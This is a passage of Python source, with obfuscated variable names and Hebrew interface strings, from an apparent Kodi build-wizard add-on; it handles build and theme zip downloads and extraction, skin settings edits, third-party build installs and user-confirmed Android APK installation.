				wiz .setS ('errors',str (OO0O0O000O000OO0O ))#line:3810
				wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OO00O000O000OO00O ,OO0O0O000O000OO0O ))#line:3811
				OO00O000OOOO0O00O =(ADDON .getSetting ("gaiaseren"))#line:3813
				if OO00O000OOOO0O00O =='true':#line:3814
					wiz .kodi17Fix ()#line:3815
				fastupdatefirstbuild (NOTEID )#line:3816
				skin_homeselect ()#line:3817
				skin_lower ()#line:3818
				rdbuildinstall ()#line:3819
				try :gaiaserenaddon ()#line:3821
				except :pass #line:3822
				adults18 ()#line:3823
				skinfix18 ()#line:3824
				try :os .remove (OO00OOO0OO0OO0000 )#line:3826
				except :pass #line:3827
				if OO00O000OOOO0O00O =='true':#line:3829
					wiz .kodi17Fix ()#line:3830
				if int (float (OO0O0O000O000OO0O ))>0 :#line:3832
					O00OOOO00000O00O0 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO00OOOOOO00OOO0O ,wiz .checkBuild (OO00OOOOOO00OOO0O ,'version')),'הושלם: [COLOR %s]%s%s[/COLOR] [שגיאות:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,OO00O000O000OO00O ,'%',COLOR1 ,OO0O0O000O000OO0O ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:3833
					if O00OOOO00000O00O0 :#line:3834
						if isinstance (OO0O0O000O000OO0O ,unicode ):#line:3835
							O0O0OO0O0OO00O000 =O0O0OO0O0OO00O000 .encode ('utf-8')#line:3836
						wiz .TextBox (ADDONTITLE ,O0O0OO0O0OO00O000 )#line:3837
				DP .close ()#line:3838
				OO00O0O0O0OOOOO0O =wiz .themeCount (OO00OOOOOO00OOO0O )#line:3839
				indicator ()#line:3840
				if not OO00O0O0O0OOOOO0O ==False :#line:3841
					buildWizard (OO00OOOOOO00OOO0O ,'theme')#line:3842
				if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:3843
				if INSTALLMETHOD ==1 :O00O000O00000OO0O =1 #line:3844
				elif INSTALLMETHOD ==2 :O00O000O00000OO0O =0 #line:3845
				else :resetkodi ()#line:3846
				if O00O000O00000OO0O ==1 :wiz .reloadFix ()#line:3848
				else :wiz .killxbmc (True )#line:3849
			else :#line:3850
				if isinstance (OO0O0O000O000OO0O ,unicode ):#line:3851
					O0O0OO0O0OO00O000 =O0O0OO0O0OO00O000 .encode ('utf-8')#line:3852
				O00OOO0O0OO000000 =open (OO00OOO0OO0OO0000 ,'r')#line:3853
				O0O00O00O0OO00OO0 =O00OOO0O0OO000000 .read ()#line:3854
				O0000OO0O00OO0O00 =''#line:3855
				for OO00OOOO00OO0OOO0 in O0OO00OO0O00OOOO0 :#line:3856
				  O0000OO0O00OO0O00 ='key: '+O0000OO0O00OO0O00 +'\n'+OO00OOOO00OO0OOO0 #line:3857
				wiz .TextBox ("%s: בעיה בהתקנת הבילד"%ADDONTITLE ,O0O0OO0O0OO00O000 +'לפתרון הבעיה יש לשנות את התאריך במכשיר ליום אחד קודם.'+O0000OO0O00OO0O00 )#line:3858
		else :#line:3859
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנת הבילד: מבוטלת![/COLOR]'%COLOR2 )#line:3860
	elif OOO0O0O00O0O0O00O =='theme':#line:3861
		if theme ==None :#line:3862
			OO00O0O0O0OOOOO0O =wiz .checkBuild (OO00OOOOOO00OOO0O ,'theme')#line:3863
			OO00OOOOOOO00O000 =[]#line:3864
			if not OO00O0O0O0OOOOO0O =='http://'and wiz .workingURL (OO00O0O0O0OOOOO0O )==True :#line:3865
				OO00OOOOOOO00O000 =wiz .themeCount (OO00OOOOOO00OOO0O ,False )#line:3866
				if len (OO00OOOOOOO00O000 )>0 :#line:3867
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The Build [COLOR %s]%s[/COLOR] comes with [COLOR %s]%s[/COLOR] different themes"%(COLOR2 ,COLOR1 ,OO00OOOOOO00OOO0O ,COLOR1 ,len (OO00OOOOOOO00O000 )),"Would you like to install one now?[/COLOR]",yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]"):#line:3868
						wiz .log ("Theme List: %s "%str (OO00OOOOOOO00O000 ))#line:3869
						OOOO000OOO0O00OOO =DIALOG .select (ADDONTITLE ,OO00OOOOOOO00O000 )#line:3870
						wiz .log ("Theme install selected: %s"%OOOO000OOO0O00OOO )#line:3871
						if not OOOO000OOO0O00OOO ==-1 :theme =OO00OOOOOOO00O000 [OOOO000OOO0O00OOO ];O0O00OO0O00O00O00 =True #line:3872
						else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:3873
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:3874
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: None Found![/COLOR]'%COLOR2 )#line:3875
		else :O0O00OO0O00O00O00 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to install the theme:'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,theme ),'for [COLOR %s]%s v%s[/COLOR]?[/COLOR]'%(COLOR1 ,OO00OOOOOO00OOO0O ,wiz .checkBuild (OO00OOOOOO00OOO0O ,'version')),yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]")#line:3876
		if O0O00OO0O00O00O00 :#line:3877
			OOOOO000OOOO0O00O =wiz .checkTheme (OO00OOOOOO00OOO0O ,theme ,'url')#line:3878
			O0O0OO0OOO0O0OOOO =OO00OOOOOO00OOO0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3879
			if not wiz .workingURL (OOOOO000OOOO0O00O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Invalid Zip Url![/COLOR]'%COLOR2 );return False #line:3880
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3881
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme ),'','Please Wait')#line:3882
			OO00OOO0OO0OO0000 =os .path .join (PACKAGES ,'%s.zip'%O0O0OO0OOO0O0OOOO )#line:3883
			try :os .remove (OO00OOO0OO0OO0000 )#line:3884
			except :pass #line:3885
			downloader .download (OOOOO000OOOO0O00O ,OO00OOO0OO0OO0000 ,DP )#line:3886
			xbmc .sleep (1000 )#line:3887
			DP .update (0 ,"","Installing %s "%OO00OOOOOO00OOO0O )#line:3888
			OOOOOOOO0O0O00O0O =False #line:3889
			if url not in ["fresh","normal"]:#line:3890
				OOOOOOOO0O0O00O0O =testTheme (OO00OOO0OO0OO0000 )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:3891
				OO0O0O0OO00OOOOO0 =testGui (OO00OOO0OO0OO0000 )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:3892
				if OOOOOOOO0O0O00O0O ==True :#line:3893
					wiz .lookandFeelData ('save')#line:3894
					OOOO0O00OOO0OO00O ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:3895
					OOOOOOOO0O0OO0000 =xbmc .getSkinDir ()#line:3896
					skinSwitch .swapSkins (OOOO0O00OOO0OO00O )#line:3898
					O000O0OOOO00000O0 =0 #line:3899
					xbmc .sleep (1000 )#line:3900
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O000O0OOOO00000O0 <150 :#line:3901
						O000O0OOOO00000O0 +=1 #line:3902
						xbmc .sleep (1000 )#line:3903
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:3904
						wiz .ebi ('SendClick(11)')#line:3905
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:3906
					xbmc .sleep (1000 )#line:3907
			O0O000000000OOO00 ='[COLOR %s][B]Installing Theme:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme )#line:3908
			DP .update (0 ,O0O000000000OOO00 ,'','אנא המתן')#line:3909
			OO00O000O000OO00O ,OO0O0O000O000OO0O ,O0O0OO0O0OO00O000 =extract .all (OO00OOO0OO0OO0000 ,HOME ,DP ,title =O0O000000000OOO00 )#line:3910
			wiz .setS ('buildtheme',theme )#line:3911
			wiz .log ('INSTALLED %s: [שגיאות:%s]'%(OO00O000O000OO00O ,OO0O0O000O000OO0O ))#line:3912
			DP .close ()#line:3913
			if url not in ["fresh","normal"]:#line:3914
				wiz .forceUpdate ()#line:3915
				if KODIV >=17 :wiz .kodi17Fix ()#line:3916
				if OO0O0O0OO00OOOOO0 ==True :#line:3917
					wiz .lookandFeelData ('save')#line:3918
					wiz .defaultSkin ()#line:3919
					OOOOOOOO0O0OO0000 =wiz .getS ('defaultskin')#line:3920
					skinSwitch .swapSkins (OOOOOOOO0O0OO0000 )#line:3921
					O000O0OOOO00000O0 =0 #line:3922
					xbmc .sleep (1000 )#line:3923
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O000O0OOOO00000O0 <150 :#line:3924
						O000O0OOOO00000O0 +=1 #line:3925
						xbmc .sleep (1000 )#line:3926
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:3928
						wiz .ebi ('SendClick(11)')#line:3929
					wiz .lookandFeelData ('restore')#line:3930
				elif OOOOOOOO0O0O00O0O ==True :#line:3931
					skinSwitch .swapSkins (OOOOOOOO0O0OO0000 )#line:3932
					O000O0OOOO00000O0 =0 #line:3933
					xbmc .sleep (1000 )#line:3934
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O000O0OOOO00000O0 <150 :#line:3935
						O000O0OOOO00000O0 +=1 #line:3936
						xbmc .sleep (1000 )#line:3937
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:3939
						wiz .ebi ('SendClick(11)')#line:3940
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:3941
					wiz .lookandFeelData ('restore')#line:3942
				else :#line:3943
					wiz .ebi ("ReloadSkin()")#line:3944
					xbmc .sleep (1000 )#line:3945
					wiz .ebi ("Container.Refresh")#line:3946
		else :#line:3947
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 )#line:3948
def skin_homeselect ():#line:3952
	try :#line:3954
		O0OO0O000OO00O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3955
		O0OOO00O0O0OO00OO =open (O0OO0O000OO00O0OO ,'r')#line:3957
		O0OO0O00OOOOOOOO0 =O0OOO00O0O0OO00OO .read ()#line:3958
		O0OOO00O0O0OO00OO .close ()#line:3959
		O0O0O0000O000O0O0 ='<setting id="HomeS" type="string(.+?)/setting>'#line:3960
		OOOOOOOO0000OO00O =re .compile (O0O0O0000O000O0O0 ).findall (O0OO0O00OOOOOOOO0 )[0 ]#line:3961
		O0OOO00O0O0OO00OO =open (O0OO0O000OO00O0OO ,'w')#line:3962
		O0OOO00O0O0OO00OO .write (O0OO0O00OOOOOOOO0 .replace ('<setting id="HomeS" type="string%s/setting>'%OOOOOOOO0000OO00O ,'<setting id="HomeS" type="string"></setting>'))#line:3963
		O0OOO00O0O0OO00OO .close ()#line:3964
	except :#line:3965
		pass #line:3966
def skin_lower ():#line:3969
	OO0O00000OO0OO00O =(ADDON .getSetting ("lower"))#line:3970
	if OO0O00000OO0OO00O =='true':#line:3971
		try :#line:3974
			O00000O0OO0O000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3975
			O0O0O000O000O000O =open (O00000O0OO0O000O0 ,'r')#line:3977
			O00OO0OO000O0000O =O0O0O000O000O000O .read ()#line:3978
			O0O0O000O000O000O .close ()#line:3979
			OOO00OOOO00OO000O ='<setting id="none_widget" type="bool(.+?)/setting>'#line:3980
			OOOO0OO0000OO0O00 =re .compile (OOO00OOOO00OO000O ).findall (O00OO0OO000O0000O )[0 ]#line:3981
			O0O0O000O000O000O =open (O00000O0OO0O000O0 ,'w')#line:3982
			O0O0O000O000O000O .write (O00OO0OO000O0000O .replace ('<setting id="none_widget" type="bool%s/setting>'%OOOO0OO0000OO0O00 ,'<setting id="none_widget" type="bool">true</setting>'))#line:3983
			O0O0O000O000O000O .close ()#line:3984
			O00000O0OO0O000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3986
			O0O0O000O000O000O =open (O00000O0OO0O000O0 ,'r')#line:3988
			O00OO0OO000O0000O =O0O0O000O000O000O .read ()#line:3989
			O0O0O000O000O000O .close ()#line:3990
			OOO00OOOO00OO000O ='<setting id="DisableOverlayColor" type="bool(.+?)/setting>'#line:3991
			OOOO0OO0000OO0O00 =re .compile (OOO00OOOO00OO000O ).findall (O00OO0OO000O0000O )[0 ]#line:3992
			O0O0O000O000O000O =open (O00000O0OO0O000O0 ,'w')#line:3993
			O0O0O000O000O000O .write (O00OO0OO000O0000O .replace ('<setting id="DisableOverlayColor" type="bool%s/setting>'%OOOO0OO0000OO0O00 ,'<setting id="DisableOverlayColor" type="bool">true</setting>'))#line:3994
			O0O0O000O000O000O .close ()#line:3995
			O00000O0OO0O000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3997
			O0O0O000O000O000O =open (O00000O0OO0O000O0 ,'r')#line:3999
			O00OO0OO000O0000O =O0O0O000O000O000O .read ()#line:4000
			O0O0O000O000O000O .close ()#line:4001
			OOO00OOOO00OO000O ='<setting id="backgroundwallpaper" type="bool(.+?)/setting>'#line:4002
			OOOO0OO0000OO0O00 =re .compile (OOO00OOOO00OO000O ).findall (O00OO0OO000O0000O )[0 ]#line:4003
			O0O0O000O000O000O =open (O00000O0OO0O000O0 ,'w')#line:4004
			O0O0O000O000O000O .write (O00OO0OO000O0000O .replace ('<setting id="backgroundwallpaper" type="bool%s/setting>'%OOOO0OO0000OO0O00 ,'<setting id="backgroundwallpaper" type="bool">true</setting>'))#line:4005
			O0O0O000O000O000O .close ()#line:4006
			O00000O0OO0O000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4010
			O0O0O000O000O000O =open (O00000O0OO0O000O0 ,'r')#line:4012
			O00OO0OO000O0000O =O0O0O000O000O000O .read ()#line:4013
			O0O0O000O000O000O .close ()#line:4014
			OOO00OOOO00OO000O ='<setting id="show.clearlogo" type="bool(.+?)/setting>'#line:4015
			OOOO0OO0000OO0O00 =re .compile (OOO00OOOO00OO000O ).findall (O00OO0OO000O0000O )[0 ]#line:4016
			O0O0O000O000O000O =open (O00000O0OO0O000O0 ,'w')#line:4017
			O0O0O000O000O000O .write (O00OO0OO000O0000O .replace ('<setting id="show.clearlogo" type="bool%s/setting>'%OOOO0OO0000OO0O00 ,'<setting id="show.clearlogo" type="bool">false</setting>'))#line:4018
			O0O0O000O000O000O .close ()#line:4019
			O00000O0OO0O000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4023
			O0O0O000O000O000O =open (O00000O0OO0O000O0 ,'r')#line:4025
			O00OO0OO000O0000O =O0O0O000O000O000O .read ()#line:4026
			O0O0O000O000O000O .close ()#line:4027
			OOO00OOOO00OO000O ='<setting id="show.cdart" type="bool(.+?)/setting>'#line:4028
			OOOO0OO0000OO0O00 =re .compile (OOO00OOOO00OO000O ).findall (O00OO0OO000O0000O )[0 ]#line:4029
			O0O0O000O000O000O =open (O00000O0OO0O000O0 ,'w')#line:4030
			O0O0O000O000O000O .write (O00OO0OO000O0000O .replace ('<setting id="show.cdart" type="bool%s/setting>'%OOOO0OO0000OO0O00 ,'<setting id="show.cdart" type="bool">false</setting>'))#line:4031
			O0O0O000O000O000O .close ()#line:4032
			O00000O0OO0O000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4036
			O0O0O000O000O000O =open (O00000O0OO0O000O0 ,'r')#line:4038
			O00OO0OO000O0000O =O0O0O000O000O000O .read ()#line:4039
			O0O0O000O000O000O .close ()#line:4040
			OOO00OOOO00OO000O ='<setting id="furniture.showhublogo" type="bool(.+?)/setting>'#line:4041
			OOOO0OO0000OO0O00 =re .compile (OOO00OOOO00OO000O ).findall (O00OO0OO000O0000O )[0 ]#line:4042
			O0O0O000O000O000O =open (O00000O0OO0O000O0 ,'w')#line:4043
			O0O0O000O000O000O .write (O00OO0OO000O0000O .replace ('<setting id="furniture.showhublogo" type="bool%s/setting>'%OOOO0OO0000OO0O00 ,'<setting id="furniture.showhublogo" type="bool">false</setting>'))#line:4044
			O0O0O000O000O000O .close ()#line:4045
		except :#line:4050
			pass #line:4051
def thirdPartyInstall (O0OOOO00O00O000OO ,OO00O00O000OOO0OO ):#line:4053
	if not wiz .workingURL (OO00O00O000OOO0OO ):#line:4054
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Invalid URL for Build[/COLOR]'%COLOR2 );return #line:4055
	OO0O0O0OOO0OO0000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to preform a [COLOR %s]Fresh Install[/COLOR] or [COLOR %s]Normal Install[/COLOR] for:[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OOOO00O00O000OO ),yeslabel ="[B][COLOR green]Fresh Install[/COLOR][/B]",nolabel ="[B][COLOR red]Normal Install[/COLOR][/B]")#line:4056
	if OO0O0O0OOO0OO0000 ==1 :#line:4057
		freshStart ('third',True )#line:4058
	wiz .clearS ('build')#line:4059
	OOOO0O0OOOO0O00OO =O0OOOO00O00O000OO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4060
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4061
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OOOO00O00O000OO ),'','אנא המתן')#line:4062
	O00000OOO000O00O0 =os .path .join (PACKAGES ,'%s.zip'%OOOO0O0OOOO0O00OO )#line:4063
	try :os .remove (O00000OOO000O00O0 )#line:4064
	except :pass #line:4065
	downloader .download (OO00O00O000OOO0OO ,O00000OOO000O00O0 ,DP )#line:4066
	xbmc .sleep (1000 )#line:4067
	OO0O0O0OO000OOO0O ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OOOO00O00O000OO )#line:4068
	DP .update (0 ,OO0O0O0OO000OOO0O ,'','אנא המתן')#line:4069
	O00OO00O000OO0O00 ,O0O0000OOO00O0O0O ,OOO000000O00O0OO0 =extract .all (O00000OOO000O00O0 ,HOME ,DP ,title =OO0O0O0OO000OOO0O )#line:4070
	if int (float (O00OO00O000OO0O00 ))>0 :#line:4071
		wiz .fixmetas ()#line:4072
		wiz .lookandFeelData ('save')#line:4073
		wiz .defaultSkin ()#line:4074
		wiz .setS ('installed','true')#line:4076
		wiz .setS ('extract',str (O00OO00O000OO0O00 ))#line:4077
		wiz .setS ('errors',str (O0O0000OOO00O0O0O ))#line:4078
		wiz .log ('INSTALLED %s: [ERRORS:%s]'%(O00OO00O000OO0O00 ,O0O0000OOO00O0O0O ))#line:4079
		try :os .remove (O00000OOO000O00O0 )#line:4080
		except :pass #line:4081
		if int (float (O0O0000OOO00O0O0O ))>0 :#line:4082
			OOO0O0O0OO0000O00 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OOOO00O00O000OO ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,O00OO00O000OO0O00 ,'%',COLOR1 ,O0O0000OOO00O0O0O ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4083
			if OOO0O0O0OO0000O00 :#line:4084
				if isinstance (O0O0000OOO00O0O0O ,unicode ):#line:4085
					OOO000000O00O0OO0 =OOO000000O00O0OO0 .encode ('utf-8')#line:4086
				wiz .TextBox (ADDONTITLE ,OOO000000O00O0OO0 )#line:4087
	DP .close ()#line:4088
	if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4089
	if INSTALLMETHOD ==1 :O0OO00OO00OOO0000 =1 #line:4090
	elif INSTALLMETHOD ==2 :O0OO00OO00OOO0000 =0 #line:4091
	else :O0OO00OO00OOO0000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR red]Force Close[/COLOR][/B]")#line:4092
	if O0OO00OO00OOO0000 ==1 :wiz .reloadFix ()#line:4093
	else :wiz .killxbmc (True )#line:4094
def testTheme (OOOOOOO0O0O0O0000 ):#line:4096
	O00O0O00OO0O00O00 =zipfile .ZipFile (OOOOOOO0O0O0O0000 )#line:4097
	for O0O00OOOO0O0O0O0O in O00O0O00OO0O00O00 .infolist ():#line:4098
		if '/settings.xml'in O0O00OOOO0O0O0O0O .filename :#line:4099
			return True #line:4100
	return False #line:4101
def testGui (OO0O0O00O0OO0O000 ):#line:4103
	OO000O0OO0O00O000 =zipfile .ZipFile (OO0O0O00O0OO0O000 )#line:4104
	for OO000OO0000OO0000 in OO000O0OO0O00O000 .infolist ():#line:4105
		if '/guisettings.xml'in OO000OO0000OO0000 .filename :#line:4106
			return True #line:4107
	return False #line:4108
def apkInstaller (OO0OOO00O000OO0O0 ,OOO00O000OO0O00OO ):#line:4110
	wiz .log (OO0OOO00O000OO0O0 )#line:4111
	wiz .log (OOO00O000OO0O00OO )#line:4112
	if wiz .platform ()=='android':#line:4113
		O0OO0000O000O0O00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0OOO00O000OO0O0 ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:4114
		if not O0OO0000O000O0O00 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:4115
		OO00OOO000OOOOOOO =OO0OOO00O000OO0O0 #line:4116
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4117
		if not wiz .workingURL (OOO00O000OO0O00OO )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:4118
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO00OOO000OOOOOOO ),'','אנא המתן')#line:4119
		O000OOOOOO0OO0OO0 =os .path .join (PACKAGES ,"%s.apk"%OO0OOO00O000OO0O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:4120
		try :os .remove (O000OOOOOO0OO0OO0 )#line:4121
		except :pass #line:4122
		downloader .download (OOO00O000OO0O00OO ,O000OOOOOO0OO0OO0 ,DP )#line:4123
		xbmc .sleep (100 )#line:4124
		DP .close ()#line:4125
		notify .apkInstaller (OO0OOO00O000OO0O0 )#line:4126
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+O000OOOOOO0OO0OO0 +'")')#line:4127
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:4128
def createMenu (O0O0O0O00OO0O0O0O ,OO000OOO0O00O0O00 ,O0OOO00O000O0000O ):#line:4134
	if O0O0O0O00OO0O0O0O =='saveaddon':#line:4135
		OOO000OO00O0000O0 =[]#line:4136
		O0000O0OO000O0OO0 =urllib .quote_plus (OO000OOO0O00O0O00 .lower ().replace (' ',''))#line:4137
		O0OOO0OOOOOOO0OOO =OO000OOO0O00O0O00 .replace ('Debrid','Real Debrid')#line:4138
		O0OO0OO0O00OOO00O =urllib .quote_plus (O0OOO00O000O0000O .lower ().replace (' ',''))#line:4139
		O0OOO00O000O0000O =O0OOO00O000O0000O .replace ('url','URL Resolver')#line:4140
		OOO000OO00O0000O0 .append ((THEME2 %O0OOO00O000O0000O .title (),' '))#line:4141
		OOO000OO00O0000O0 .append ((THEME3 %'Save %s Data'%O0OOO0OOOOOOO0OOO ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O0000O0OO000O0OO0 ,O0OO0OO0O00OOO00O )))#line:4142
		OOO000OO00O0000O0 .append ((THEME3 %'Restore %s Data'%O0OOO0OOOOOOO0OOO ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O0000O0OO000O0OO0 ,O0OO0OO0O00OOO00O )))#line:4143
		OOO000OO00O0000O0 .append ((THEME3 %'Clear %s Data'%O0OOO0OOOOOOO0OOO ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,O0000O0OO000O0OO0 ,O0OO0OO0O00OOO00O )))#line:4144
	elif O0O0O0O00OO0O0O0O =='save':#line:4145
		OOO000OO00O0000O0 =[]#line:4146
		O0000O0OO000O0OO0 =urllib .quote_plus (OO000OOO0O00O0O00 .lower ().replace (' ',''))#line:4147
		O0OOO0OOOOOOO0OOO =OO000OOO0O00O0O00 .replace ('Debrid','Real Debrid')#line:4148
		O0OO0OO0O00OOO00O =urllib .quote_plus (O0OOO00O000O0000O .lower ().replace (' ',''))#line:4149
		O0OOO00O000O0000O =O0OOO00O000O0000O .replace ('url','URL Resolver')#line:4150
		OOO000OO00O0000O0 .append ((THEME2 %O0OOO00O000O0000O .title (),' '))#line:4151
		OOO000OO00O0000O0 .append ((THEME3 %'Register %s'%O0OOO0OOOOOOO0OOO ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,O0000O0OO000O0OO0 ,O0OO0OO0O00OOO00O )))#line:4152
		OOO000OO00O0000O0 .append ((THEME3 %'Save %s Data'%O0OOO0OOOOOOO0OOO ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O0000O0OO000O0OO0 ,O0OO0OO0O00OOO00O )))#line:4153
		OOO000OO00O0000O0 .append ((THEME3 %'Restore %s Data'%O0OOO0OOOOOOO0OOO ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O0000O0OO000O0OO0 ,O0OO0OO0O00OOO00O )))#line:4154
		OOO000OO00O0000O0 .append ((THEME3 %'Import %s Data'%O0OOO0OOOOOOO0OOO ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,O0000O0OO000O0OO0 ,O0OO0OO0O00OOO00O )))#line:4155
		OOO000OO00O0000O0 .append ((THEME3 %'Clear Addon %s Data'%O0OOO0OOOOOOO0OOO ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,O0000O0OO000O0OO0 ,O0OO0OO0O00OOO00O )))#line:4156
	elif O0O0O0O00OO0O0O0O =='install':#line:4157
		OOO000OO00O0000O0 =[]#line:4158
		O0OO0OO0O00OOO00O =urllib .quote_plus (O0OOO00O000O0000O )#line:4159
		OOO000OO00O0000O0 .append ((THEME2 %O0OOO00O000O0000O ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,O0OO0OO0O00OOO00O )))#line:4160
